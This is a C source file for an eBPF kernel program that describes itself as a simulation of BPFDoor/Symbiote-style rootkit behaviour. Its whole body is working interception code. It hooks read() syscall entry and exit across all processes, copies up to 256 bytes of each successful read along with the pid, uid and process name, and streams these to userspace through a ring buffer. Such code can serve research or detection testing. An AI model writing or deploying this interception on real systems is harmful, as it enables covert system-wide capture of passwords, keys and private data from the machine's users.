// intercept.c - eBPF kernel program
// Hooks the read() syscall exit to intercept data being read by processes
// Passes intercepted data to userspace via a ring buffer map
// Simulates eBPF rootkit behavior (BPFDoor/Symbiote style)

#include <linux/bpf.h>
#include <linux/ptrace.h>
#include <linux/types.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

// Maximum size of data to capture per read() call
#define MAX_DATA_SIZE 256

// Structure to hold intercepted data sent to userspace
struct event {
    __u32 pid;
    __u32 uid;
    __s64 bytes_read;
    char data[MAX_DATA_SIZE];
    char comm[16];  // process name
};

// Ring buffer map - shared between kernel eBPF program and userspace
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 1 << 24);  // 16MB ring buffer
} intercepted_data SEC(".maps");

// Scratch map to temporarily store the read buffer pointer between
// sys_enter_read and sys_exit_read
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 10240);
    __type(key, __u32);
    __type(value, __u64);
} read_buf_map SEC(".maps");

// Hook on read() syscall entry - save the buffer pointer
SEC("tracepoint/syscalls/sys_enter_read")
int trace_read_enter(struct trace_event_raw_sys_enter *ctx)
{
    __u32 pid = bpf_get_current_pid_tgid() >> 32;
    __u64 buf_ptr = (unsigned long)ctx->args[1];
    bpf_map_update_elem(&read_buf_map, &pid, &buf_ptr, BPF_ANY);
    return 0;
}

// Hook on read() syscall exit - capture what was actually read
SEC("tracepoint/syscalls/sys_exit_read")
int trace_read_exit(struct trace_event_raw_sys_exit *ctx)
{
    __u32 pid = bpf_get_current_pid_tgid() >> 32;
    __s64 bytes_read = ctx->ret;

    // Only capture successful reads with actual data
    if (bytes_read <= 0) {
        bpf_map_delete_elem(&read_buf_map, &pid);
        return 0;
    }

    // Look up the buffer pointer we saved on entry
    __u64 *buf_ptr = bpf_map_lookup_elem(&read_buf_map, &pid);
    if (!buf_ptr) {
        return 0;
    }

    // Reserve space in the ring buffer
    struct event *e = bpf_ringbuf_reserve(&intercepted_data, sizeof(struct event), 0);
    if (!e) {
        bpf_map_delete_elem(&read_buf_map, &pid);
        return 0;
    }

    // Fill event metadata
    e->pid = pid;
    e->uid = bpf_get_current_uid_gid() & 0xFFFFFFFF;
    e->bytes_read = bytes_read;

    // Get process name
    bpf_get_current_comm(&e->comm, sizeof(e->comm));

    // Capture up to MAX_DATA_SIZE bytes from the read buffer
    __s64 capture_size = bytes_read < MAX_DATA_SIZE ? bytes_read : MAX_DATA_SIZE;
    bpf_probe_read_user(e->data, capture_size, (void *)(long)*buf_ptr);

    // Submit to ring buffer for userspace to pick up
    bpf_ringbuf_submit(e, 0);

    bpf_map_delete_elem(&read_buf_map, &pid);
    return 0;
}

char LICENSE[] SEC("license") = "GPL";
